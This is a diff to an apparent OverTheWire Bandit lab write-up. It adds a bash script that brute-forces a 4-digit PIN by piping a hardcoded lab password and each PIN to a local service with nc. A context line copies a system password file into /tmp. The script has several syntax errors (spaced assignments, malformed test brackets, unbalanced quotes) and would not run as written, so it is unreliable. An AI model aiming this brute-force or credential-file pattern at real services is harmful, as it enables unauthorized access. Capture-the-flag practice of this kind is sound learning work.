@@ -223,3 +223,21 @@ cat /etc/bandit_pass/bandit24 >> /tmp/abc22/bandit24pass
 Then, we will find the bandit24 file in our directory. And, we're done!
 
 # Level 24 - Level 25
+
+```bash
+#!/bin/bash
+
+pass = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+pin = 0
+
+while [$pin -lt 10000]; do
+	echo "Attempting PIN: $pin"
+	attempt = "$(echo $pass $pin | nc localhost 30002)"
+	if ![[$attempt == *"Wrong!"*]]; then
+		echo -ne ""$attempt"
+		break
+	fi
+	((pin++))
+done
+```
